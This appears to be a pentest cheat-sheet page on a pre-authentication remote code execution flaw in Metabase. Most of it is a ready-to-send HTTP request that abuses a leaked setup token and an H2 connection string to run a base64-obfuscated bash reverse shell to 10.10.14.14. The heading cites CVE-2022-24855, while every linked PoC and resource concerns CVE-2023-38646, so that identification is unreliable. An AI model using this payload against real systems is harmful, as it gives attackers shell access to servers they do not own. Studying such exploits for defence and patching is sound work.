---
description: Metabase - Remote Code Execution
---

# CVE-2022-24855

Metabase - Remote Code Execution / Pre-Auth

Vulnerability: `/api/session/properties` leaks setup-id token that can be validated sending a post request to `/api/setup/validate`

```
POST /api/setup/validate HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 812

{
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/birds_of_the_world-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjE0LzQzMyAwPiYxCg==|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

<mark style="color:purple;">**POC:**</mark>

{% embed url="https://github.com/securezeron/CVE-2023-38646" %}

{% embed url="https://github.com/kh4sh3i/CVE-2023-38646" %}

<mark style="color:purple;">**Resources:**</mark>

{% embed url="https://www.metabase.com/blog/security-incident-summary" %}

{% embed url="https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/" %}

{% embed url="https://nvd.nist.gov/vuln/detail/cve-2022-24855" %}
